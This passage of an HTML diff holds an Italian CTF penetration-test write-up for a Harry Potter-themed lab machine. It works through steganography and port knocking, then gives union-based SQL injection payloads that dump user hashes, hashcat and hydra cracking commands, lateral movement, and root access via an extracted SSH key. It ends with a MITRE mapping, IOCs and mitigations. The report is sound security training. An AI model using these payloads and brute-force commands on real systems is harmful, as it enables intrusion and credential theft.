+        <tr><td class="mono">12000</td><td><strong>il</strong></td><td>Sorgente <code>/oldsite/login.php</code></td></tr>
+        <tr><td class="mono">9991</td><td><strong>di</strong></td><td>Sorgente <code>/login.php</code></td></tr>
+        <tr><td class="mono">55677</td><td><strong>non avere</strong></td><td>CSS Editor <code>/login.php</code></td></tr>
+        <tr><td class="mono">37789</td><td><strong>buone</strong></td><td>CSS Editor <code>/oldsite/login.php</code></td></tr>
+        <tr><td class="mono">7282</td><td><strong>intenzioni</strong></td><td>Directory <code>/tmp/</code></td></tr>
+        <tr><td class="mono">41002</td><td><strong>misfatto</strong></td><td>Directory <code>/oldsite/tmp/</code></td></tr>
+        <tr><td class="mono">65511</td><td><strong>fatto</strong></td><td>Directory <code>/welcome.php</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/4-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 2.2
+	Brainfuck — Frammenti sorgente e decodifica pt1
+  </p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/4-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 2.2
+	Brainfuck — Frammenti sorgente e decodifica pt2
+  </p>
+  </div>
+
+  <h4>2.3 Analisi Steganografica (theta-logo.jpg)</h4>
+  <p>L'asset grafico <code>theta-logo.jpg</code> è stato analizzato per verificare la presenza di dati nascosti. La passphrase, dedotta dal contesto narrativo Harry Potter, è stata <em>accio</em>.</p>
+  <pre data-label="Comando · steghide">$ steghide extract -sf theta-logo.jpg -p accio</pre>
+  <p><strong>Risultato:</strong> estrazione del file <code>poesia.txt</code> contenente una poesia con riferimenti a "22 o 2222", confermando l'importanza dei servizi SSH e web rilevati.</p>
+
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/5-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 2.3
+	Steganografia — Estrazione poesia.txt pt1
+  </p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/5-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 2.3
+	Steganografia — Estrazione poesia.txt pt2
+  </p>
+  </div>
+
+  <!-- ── FASE 3: SQL INJECTION ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 3</span> — Vulnerability Assessment: SQL Injection</h3>
+
+  <h4>3.1 Identificazione della Vulnerabilità</h4>
+  <p>I test di input sui form di login hanno rivelato una gestione non sicura delle query al database. L'inserimento del payload classico <code>' OR 'a'='a</code> ha generato un <strong>errore fatale</strong> nel backend del sito old, confermando la possibilità di manipolare la query SQL originale. Il sistema è stato identificato come basato su <strong>MariaDB</strong>.</p>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/6-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 3.1
+	Errore SQL rivelatore su /oldsite/login.php
+  </p>
+  </div>
+
+  <h4>3.2 Sfruttamento (Union-Based SQLi)</h4>
+  <p>È stata utilizzata una tecnica di <strong>Union-Based SQL Injection</strong> per esfiltrare dati dal database attraverso il form di login. La tecnica di inversione delle colonne è risultata efficace per allineare i tipi di dati.</p>
+
+  <pre data-label="Payload · Identificazione DB">' UNION SELECT database(),2#</pre>
+
+  <h4>3.3 Esfiltrazione dei Dati (Data Dumping)</h4>
+  <p>Attraverso una serie di query mirate, è stata ricostruita l'intera struttura del database:</p>
+
+  <pre data-label="Step 1 · Enumerazione Tabelle">' UNION SELECT group_concat(table_name),2
+  FROM information_schema.tables
+  WHERE table_schema=database()#</pre>
+
+  <pre data-label="Step 2 · Enumerazione Colonne">' UNION SELECT group_concat(column_name),2
+  FROM information_schema.columns
+  WHERE table_name='users'#</pre>
+
+  <pre data-label="Step 3 · Estrazione Credenziali">' UNION SELECT group_concat(username,':',password),2
+  FROM users#</pre>
+
+  <p><strong>Risultati dell'estrazione:</strong></p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Utente</th><th>Hash (BCrypt $2y$10)</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">anna</td><td class="mono">$2y$10$Dy2MtfKLFvH78.bLGp6a7uBdSE1WNCSbnT0HvAQLyT2iGZWGO7TMK</td></tr>
+        <tr><td class="mono">luca</td><td class="mono">$2y$10$lNS1EUevEtLqsp.OEq4UkuGREzvkouhZCdpT9h5t.Fw6oBZsai.Ei</td></tr>
+        <tr><td class="mono">marco</td><td class="mono">$2y$10$gdY5a.GIC6ulg7ybIBMh0OU7Cdo.pEebWsL7E/CLGFHoTG39LePAK</td></tr>
+        <tr><td class="mono">milena</td><td class="mono">$2y$10$3ESgP8ETH4VPpbsw4C5hze6bP6QEDMByxelQEPUdh7Uh6Q6aHRZDy</td></tr>
+      </tbody>
+    </table>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/6-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 3.3
+	SQL Injection — Dump completo credenziali
+  </p>
+  </div>
+
+  <h4>3.4 Cracking delle Password (Hashcat)</h4>
+  <p>Gli hash estratti appartengono alla famiglia <strong>BCrypt</strong> (costo 10). È stato utilizzato Hashcat con la wordlist <code>rockyou.txt</code>.</p>
+  <pre data-label="Comando · hashcat">$ hashcat -m 3200 DumpMilena /usr/share/wordlists/rockyou.txt</pre>
+
+  <div class="box tip">
+    <p><strong>Risultato:</strong> <code>milena:darkprincess</code> — craccata con successo. La password era nelle prime migliaia di rockyou.txt.</p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/7.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 3.4
+	Hashcat — Cracking BCrypt milena:darkprincess
+  </p>
+  </div>
+
+  <!-- ── FASE 4: AUTENTICAZIONE & PORT KNOCKING ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 4</span> — Autenticazione, Port Knocking & Foothold</h3>
+
+  <h4>4.1 Triggering dei Messaggi di Sistema</h4>
+  <p>L'inserimento delle frasi rituali decodificate nei form di login ha attivato risposte dinamiche con indizi cruciali:</p>
+
+  <div class="box phase">
+    <p><strong>Sito Standard (<code>/login.php</code>):</strong></p>
+    <p>Input: <em>giuro solennemente di non avere buone intenzioni</em></p>
+    <p>Risposta: <em>"Caro user, la Mappa del Malandrino nasconde un altro segreto. Hai provato a bussare?"</em></p>
+    <p>Analisi: il riferimento al "bussare" conferma il meccanismo di <strong>Port Knocking</strong>.</p>
+  </div>
+
+  <div class="box phase">
+    <p><strong>Sito Old (<code>/oldsite/login.php</code>):</strong></p>
+    <p>Input: <em>fatto il misfatto</em></p>
+    <p>Risposta: <em>"Attenzione! La bacchetta di Milena ha reagito in modo strano vicino al libro di incantesimi di Luca..."</em></p>
+    <p>Analisi: suggerisce un account di sistema (<code>user</code>) non presente nel dump SQL.</p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/8-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 4.1
+	Messaggi rituali — Risposte dei form di login /oldsite
+  </p>
+  </div>
+
+  <h4>4.2 Brute-Force SSH e Foothold</h4>
+  <p>L'analisi degli indizi ha portato all'ipotesi di un utente <code>user</code> di sistema. Testato con Hydra contro SSH sulla porta 2222:</p>
+  <pre data-label="Comando · hydra">$ hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10:2222</pre>
+
+  <div class="box tip">
+    <p><strong>Risultato:</strong> <code>user:harry</code> — credenziali valide. Foothold ottenuto.</p>
+  </div>
+
+  <pre data-label="Stabilizzazione accesso">$ ssh user@192.168.0.10 -p 2222</pre>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/9.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 4.2
+	Hydra — Brute-force SSH user:harry
+  </p>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/9-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 4.2
+	Login SSH come user
+  </p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/9-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 4.2
+	Ricerca 1700 - Solennemente
+  </p>
+  </div>
+
+  <!-- ── FASE 5: POST-EXPLOITATION ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 5</span> — Post-Exploitation: Port Knocking & Lateral Movement</h3>
+
+  <h4>5.1 Completamento della Sequenza Port Knocking</h4>
+  <p>Durante la sessione SSH come <code>user</code>, l'esplorazione del file system ha confermato il numero <strong>1700</strong> associato alla parola <em>solennemente</em>. La sequenza definitiva è stata ricostruita:</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>#</th><th>Porta</th><th>Parola</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td class="mono">9220</td><td>Giuro</td></tr>
+        <tr><td>2</td><td class="mono">1700</td><td>Solennemente</td></tr>
+        <tr><td>3</td><td class="mono">9991</td><td>Di</td></tr>
+        <tr><td>4</td><td class="mono">55677</td><td>Non avere</td></tr>
+        <tr><td>5</td><td class="mono">37789</td><td>Buone</td></tr>
+        <tr><td>6</td><td class="mono">7282</td><td>Intenzioni</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h4>5.2 Esecuzione del Port Knocking</h4>
+  <pre data-label="Comando · knock">$ knock -v 192.168.0.10 9220 1700 9991 55677 37789 7282</pre>
+
+  <h4>5.3 Verifica Apertura Porta 22</h4>
+  <pre data-label="Comando · nmap verifica">$ nmap -sV -sC -p 22 192.168.0.10</pre>
+  <p><strong>Risultato:</strong> <span class="status-chip done">22/tcp OPEN</span> — SSH standard ora accessibile.</p>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/10.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 5.2–5.3
+	Port Knocking — Sequenza knock + nmap porta 22 OPEN
+  </p>
+  </div>
+
+  <h4>5.4 Movimento Laterale: Accesso come Milena</h4>
+  <p>Con la porta 22 aperta e le credenziali craccate, accesso eseguito come <code>milena:darkprincess</code>.</p>
+
+  <h4>5.5 Scoperta Directory Condivisa e Swap File</h4>
+  <p>Esplorazione del file system come milena ha rivelato la directory <code>/home/shared</code> con il file <code>.myLovePotion.swp</code> — un file di swap di Vim contenente stringhe ad alta entropia:</p>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/11-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 5.4
+	Accesso come milena e movimento laterale pt1
+  </p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/11-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 5.4
+	Accesso come milena e movimento laterale pt2
+  </p>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Stringa Estratta</th><th>Destinazione Probabile</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">ai(q4P7&gt;(Fw9S3P</td><td>Password utente (Luca/Anna)</td></tr>
+        <tr><td class="mono">9iT(0F98!7^-I&amp;h</td><td>Password utente (Luca/Anna)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h4>5.6 Movimento Laterale: Accesso a Luca e Marco</h4>
+  <p>Tramite <code>su</code> (Switch User), le credenziali sono state testate con successo:</p>
+  <ul>
+    <li><strong>Marco:</strong> accesso eseguito — nessun file di interesse nella home</li>
+    <li><strong>Luca:</strong> accesso eseguito — flag utente acquisita + file sospetto <code>.theta-key.jpg.bk</code> individuato</li>
+  </ul>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/12.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 5.5
+	Lateral Movement — milena, swap file, su luca
+  </p>
+  </div>
+
+  <!-- ── FASE 6: ESFILTRAZIONE & STEGANOGRAFIA AVANZATA ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 6</span> — Esfiltrazione & Steganografia Avanzata</h3>
+
+  <h4>6.1 Esfiltrazione theta-key.jpg</h4>
+  <p>Il file <code>.theta-key.jpg.bk</code> nella home di Luca aveva permessi restrittivi. Il blocco è stato aggirato sfruttando i permessi del gruppo <code>shared</code>, spostando una copia nella directory condivisa.</p>
+  <pre data-label="Comando · SCP esfiltrazione">$ scp -P 2222 milena@192.168.0.10:/home/shared/scambio.jpg \
+    ~/Downloads/HarryPotter/theta-key.jpg</pre>
+
+  <h4>6.2 Estrazione della Chiave Privata RSA</h4>
+  <p>Sulla macchina Kali, l'immagine è stata sottoposta ad analisi steganografica utilizzando la passphrase recuperata dal file di swap.</p>
+  <pre data-label="Comando · steghide">$ steghide extract -sf theta-key.jpg -p "ai(q4P7>(Fw9S3P"</pre>
+
+  <div class="box danger">
+    <p><strong>Risultato critico:</strong> estrazione del file <code>id_rsa</code> — una chiave privata SSH per l'utente <strong>root</strong>.</p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/13.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 6.1
+	Steganografia — Estrazione id_rsa da theta-key.jpg
+  </p>
+  </div>
+
+  <!-- ── FASE 7: PRIVILEGE ESCALATION ── -->
+  <h3 style="margin-top: 50px;"><span class="cyan">FASE 7</span> — Privilege Escalation: Root</h3>
+
+  <h4>7.1 Hardening della Chiave e Accesso Root</h4>
+  <p>La chiave RSA estratta permette di bypassare completamente l'autenticazione basata su password.</p>
+  <pre data-label="Comandi · escalation finale">$ chmod 600 id_rsa
+$ ssh -i id_rsa root@192.168.0.10</pre>
+
+  <h4>7.2 Acquisizione Root Flag</h4>
+  <pre data-label="Root shell">root@theta:~# cat /root/flag.txt
+FLAG{misfatto_compiuto_999_root}</pre>
+
+  <div class="box tip">
+    <p><strong>MISSIONE COMPLETATA.</strong> Accesso amministrativo totale ottenuto. Root flag acquisita: <code>FLAG{misfatto_compiuto_999_root}</code></p>
+  </div>
+
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/14-a.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 7
+	Root Shell — Accesso root e flag finale pt1
+  </p>
+  </div>
+  
+  <div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/14-b.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Evidence · Fase 7
+	Root Shell — Accesso root e flag finale pt2
+  </p>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     6 · TOOL & TECNOLOGIE
+     ══════════════════════════════════════ -->
+<article class="section" id="s6">
+  <div class="section-num">Sezione 06</div>
+  <h2>Tool, Tecnologie <em>& Ambiente</em></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Categoria</th><th>Tool</th><th>Versione</th><th>Uso nel Task</th></tr></thead>
+      <tbody>
+        <tr><td>OS / Lab</td><td>Kali Linux</td><td class="mono">2025.x</td><td>Piattaforma offensiva principale</td></tr>
+        <tr><td>Network Recon</td><td>netdiscover</td><td class="mono">0.10.0</td><td>ARP scan — identificazione host</td></tr>
+        <tr><td>Port Scanning</td><td>Nmap</td><td class="mono">7.99</td><td>SYN Stealth Scan, OS/service fingerprinting</td></tr>
+        <tr><td>Web Enum</td><td>ffuf</td><td class="mono">2.1.0</td><td>Directory brute-forcing</td></tr>
+        <tr><td>Web Proxy</td><td>Burp Suite CE</td><td class="mono">2024.x</td><td>Intercept request, analisi SQLi</td></tr>
+        <tr><td>Exploitation</td><td>SQL payload manuale</td><td class="mono">—</td><td>UNION-based SQLi su MariaDB</td></tr>
+        <tr><td>Password Cracking</td><td>Hashcat</td><td class="mono">6.2.6</td><td>Crack BCrypt -m 3200 con rockyou.txt</td></tr>
+        <tr><td>Brute Force</td><td>Hydra</td><td class="mono">9.5</td><td>SSH brute-force user su porta 2222</td></tr>
+        <tr><td>Steganografia</td><td>steghide / stegseek</td><td class="mono">0.6 / 1.0</td><td>Estrazione file da JPEG/PNG</td></tr>
+        <tr><td>Port Knocking</td><td>knock</td><td class="mono">0.8</td><td>Sequenza pacchetti SYN su 6 porte</td></tr>
+        <tr><td>Lateral Movement</td><td>SSH / su</td><td class="mono">—</td><td>Cambio utente e accesso laterale</td></tr>
+        <tr><td>Esfiltrazione</td><td>SCP</td><td class="mono">—</td><td>Trasferimento file via SSH</td></tr>
+        <tr><td>Decodifica</td><td>brainfuck.net</td><td class="mono">online</td><td>Decodifica messaggi Brainfuck</td></tr>
+        <tr><td>Hash ID</td><td>hashes.com</td><td class="mono">online</td><td>Identificazione tipo hash (BCrypt $2y$10)</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     7 · MITRE ATT&CK
+     ══════════════════════════════════════ -->
+<article class="section" id="s7">
+  <div class="section-num">Sezione 07</div>
+  <h2>MITRE ATT&CK <em>Mapping</em></h2>
+
+  <p>Framework: <strong>MITRE ATT&CK v14 — Enterprise</strong></p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Tactic</th><th>ID</th><th>Technique</th><th>Dettaglio Operativo</th></tr></thead>
+      <tbody>
+        <tr><td>Reconnaissance</td><td class="mono">T1595.001</td><td>Active Scanning: IP Blocks</td><td>netdiscover ARP scan 192.168.0.0/24</td></tr>
+        <tr><td>Reconnaissance</td><td class="mono">T1595.002</td><td>Active Scanning: Vuln Scanning</td><td>Nmap -sS -sV -O su target</td></tr>
+        <tr><td>Initial Access</td><td class="mono">T1190</td><td>Exploit Public-Facing Application</td><td>SQL Injection su /oldsite/login.php</td></tr>
+        <tr><td>Credential Access</td><td class="mono">T1110.001</td><td>Brute Force: Password Guessing</td><td>Hydra SSH porta 2222 → user:harry</td></tr>
+        <tr><td>Credential Access</td><td class="mono">T1110.002</td><td>Brute Force: Password Cracking</td><td>Hashcat BCrypt → milena:darkprincess</td></tr>
+        <tr><td>Credential Access</td><td class="mono">T1003</td><td>OS Credential Dumping</td><td>Dump DB via SQLi UNION SELECT</td></tr>
+        <tr><td>Discovery</td><td class="mono">T1046</td><td>Network Service Discovery</td><td>Nmap port scan + ffuf dir enum</td></tr>
+        <tr><td>Discovery</td><td class="mono">T1083</td><td>File and Directory Discovery</td><td>/home/shared, /tmp, /oldsite</td></tr>
+        <tr><td>Collection</td><td class="mono">T1005</td><td>Data from Local System</td><td>.myLovePotion.swp con credenziali</td></tr>
+        <tr><td>Lateral Movement</td><td class="mono">T1078</td><td>Valid Accounts</td><td>su milena / luca / marco</td></tr>
+        <tr><td>Lateral Movement</td><td class="mono">T1021.004</td><td>Remote Services: SSH</td><td>SSH post-knock porta 22</td></tr>
+        <tr><td>Exfiltration</td><td class="mono">T1048.003</td><td>Exfil Over Unencrypted Protocol</td><td>SCP theta-key.jpg → Kali</td></tr>
+        <tr><td>Privilege Escalation</td><td class="mono">T1548</td><td>Abuse Elevation Control</td><td>Chiave RSA root da steganografia</td></tr>
+        <tr><td>Defense Evasion</td><td class="mono">T1027</td><td>Obfuscated Files</td><td>Dati nascosti in JPEG (steg)</td></tr>
+        <tr><td>Defense Evasion</td><td class="mono">T1205</td><td>Traffic Signaling</td><td>Port Knocking per porta 22</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     9 · IOC
+     ══════════════════════════════════════ -->
+<article class="section" id="s8">
+  <div class="section-num">Sezione 08</div>
+  <h2>IOC & <em>Artefatti Raccolti</em></h2>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Tipo</th><th>Valore / Artefatto</th><th>Contesto</th><th>Confidence</th></tr></thead>
+      <tbody>
+        <tr><td>IP Target</td><td class="mono">192.168.0.10</td><td>Host VirtualBox compromesso</td><td class="green">HIGH</td></tr>
+        <tr><td>MAC</td><td class="mono">08:00:27:72:5E:0F</td><td>Oracle VirtualBox NIC</td><td class="green">HIGH</td></tr>
+        <tr><td>Hash BCrypt</td><td class="mono">$2y$10$3ESg...aHRZDy</td><td>Hash password milena</td><td class="green">HIGH</td></tr>
+        <tr><td>Hash BCrypt</td><td class="mono">$2y$10$lNS1...ai.Ei</td><td>Hash password luca</td><td class="green">HIGH</td></tr>
+        <tr><td>Credential</td><td class="mono">milena:darkprincess</td><td>Web app + SSH — Hashcat</td><td class="green">HIGH</td></tr>
+        <tr><td>Credential</td><td class="mono">user:harry</td><td>SSH porta 2222 — Hydra</td><td class="green">HIGH</td></tr>
+        <tr><td>Credential</td><td class="mono">root:id_rsa</td><td>Accesso root via chiave RSA</td><td class="green">HIGH</td></tr>
+        <tr><td>Passphrase</td><td class="mono">accio</td><td>steghide theta-logo.jpg</td><td class="green">HIGH</td></tr>
+        <tr><td>Passphrase</td><td class="mono">ai(q4P7&gt;(Fw9S3P</td><td>steghide theta-key.jpg</td><td class="green">HIGH</td></tr>
+        <tr><td>Passphrase</td><td class="mono">9iT(0F98!7^-I&h</td><td>Da .myLovePotion.swp</td><td class="amber">MED</td></tr>
+        <tr><td>Port Knock</td><td class="mono">9220→1700→9991→55677→37789→7282</td><td>Sequenza apertura SSH 22</td><td class="green">HIGH</td></tr>
+        <tr><td>Flag</td><td class="mono">FLAG{misfatto_compiuto_999_root}</td><td>Root flag CTF</td><td class="green">HIGH</td></tr>
+        <tr><td>Cookie</td><td class="mono">wand=c2MqVDFsOVN5ezVi</td><td>Sessione /oldsite (base64)</td><td class="amber">MED</td></tr>
+        <tr><td>File</td><td class="mono">theta-logo.jpg</td><td>Contiene poesia.txt (steg)</td><td class="green">HIGH</td></tr>
+        <tr><td>File</td><td class="mono">.theta-key.jpg.bk</td><td>Contiene id_rsa (steg)</td><td class="green">HIGH</td></tr>
+        <tr><td>File</td><td class="mono">.myLovePotion.swp</td><td>Swap Vim — credenziali in chiaro</td><td class="green">HIGH</td></tr>
+        <tr><td>URL</td><td class="mono">hxxp://192[.]168[.]0[.]10/oldsite/login.php</td><td>Endpoint SQLi</td><td class="green">HIGH</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     10 · LESSONS LEARNED
+     ══════════════════════════════════════ -->
+<article class="section" id="s9">
+  <div class="section-num">Sezione 09</div>
+  <h2>Lessons Learned <em>& Mitigazioni</em></h2>
+
+  <h3>9.1 Cosa ha funzionato</h3>
+  <ul>
+    <li><strong>Approccio metodico PTES:</strong> recon prima dell'exploitation, nessun passaggio saltato</li>
+    <li><strong>Decomposizione parallela</strong> del task (web + steg + recon in contemporanea)</li>
+    <li><strong>ffuf con estensioni multiple</strong> per scoperta rapida di /oldsite e /tmp</li>
+    <li><strong>Intuizione sulla passphrase <em>accio</em></strong> dal contesto narrativo Harry Potter</li>
+    <li><strong>Coordinamento team:</strong> ogni membro ha guidato almeno una fase specifica</li>
+  </ul>
+
+  <h3>9.2 Criticità & Miglioramenti</h3>
+  <ul>
+    <li>Tempo speso sul Cookie /oldsite (base64 parziale) senza risultati utili — <em>skip più rapido</em></li>
+    <li>Alcune analisi PNG con stegseek non conclusive — <em>integrare zsteg come tool alternativo</em></li>
+    <li>La porta 1700 (da Hydra) nel Port Knocking non era intuitiva — <em>documentare meglio la catena</em></li>
+    <li>Permessi id_rsa sbagliati al primo tentativo — <em>ricordare chmod 600 subito</em></li>
+  </ul>
+
+  <h3>9.3 Raccomandazioni di Mitigazione</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Priorità</th><th>Raccomandazione</th><th>Owner</th><th>Costo</th></tr></thead>
+      <tbody>
+        <tr><td class="red">CRITICA</td><td>Prepared statements su tutti i form PHP</td><td>Dev Lead</td><td>Basso</td></tr>
+        <tr><td class="red">CRITICA</td><td>Rimuovere chiave RSA root da asset web</td><td>SysAdmin</td><td>Basso</td></tr>
+        <tr><td class="red">CRITICA</td><td>Eliminare/shred file .swp da directory condivise</td><td>SysAdmin</td><td>Basso</td></tr>
+        <tr><td class="amber">ALTA</td><td>Password policy: min 16 char, no dictionary words, bcrypt cost >= 12</td><td>Dev/IAM</td><td>Basso</td></tr>
+        <tr><td class="amber">ALTA</td><td>MFA su SSH + fail2ban su porta 2222</td><td>SysAdmin</td><td>Basso</td></tr>
+        <tr><td class="amber">ALTA</td><td>Rimuovere segreti da steganografia — usare vault</td><td>DevSecOps</td><td>Medio</td></tr>
+        <tr><td>MEDIA</td><td>WAF con ruleset OWASP CRS</td><td>Infra</td><td>Medio</td></tr>
+        <tr><td>MEDIA</td><td>Aggiornare Apache 2.4.52 a ultima stabile</td><td>SysAdmin</td><td>Basso</td></tr>
+        <tr><td>MEDIA</td><td>Sostituire Port Knocking con VPN/bastion + Zero Trust</td><td>Infra</td><td>Medio</td></tr>
+        <tr><td>BASSA</td><td>Security awareness training su gestione swap e backup</td><td>CISO</td><td>Basso</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+
+<!-- ══════════════════════════════════════
+     11 · RIFERIMENTI
+     ══════════════════════════════════════ -->
+<article class="section" id="s10">
+  <div class="section-num">Sezione 10</div>
+  <h2>Riferimenti <em>& Appendici</em></h2>
+
+  <h3>10.1 Riferimenti</h3>
+  <ul>
+    <li>MITRE ATT&CK v14 — <a href="https://attack.mitre.org/" style="color: var(--accent);">https://attack.mitre.org/</a></li>
+    <li>OWASP Testing Guide v4.2 — <a href="https://owasp.org/www-project-web-security-testing-guide/" style="color: var(--accent);">owasp.org</a></li>
+    <li>NIST SP 800-115 — Technical Guide to Information Security Testing</li>
+    <li>PTES — Penetration Testing Execution Standard</li>
+    <li>Hashcat — <a href="https://hashcat.net/wiki/" style="color: var(--accent);">hashcat.net</a></li>
+    <li>steghide — <a href="https://steghide.sourceforge.net/" style="color: var(--accent);">steghide.sourceforge.net</a></li>
+    <li>Hydra (THC) — <a href="https://github.com/vanhauser-thc/thc-hydra" style="color: var(--accent);">github.com/vanhauser-thc/thc-hydra</a></li>
+    <li>knockd / knock — <a href="http://www.zeroflux.org/projects/knock" style="color: var(--accent);">zeroflux.org</a></li>
+    <li>ffuf — <a href="https://github.com/ffuf/ffuf" style="color: var(--accent);">github.com/ffuf/ffuf</a></li>
+    <li>Brainfuck Decoder — <a href="https://brainfuck.net/" style="color: var(--accent);">brainfuck.net</a></li>
+  </ul>
+
+  <h3>10.2 Glossario</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Termine</th><th>Definizione</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">IOC</td><td>Indicator of Compromise</td></tr>
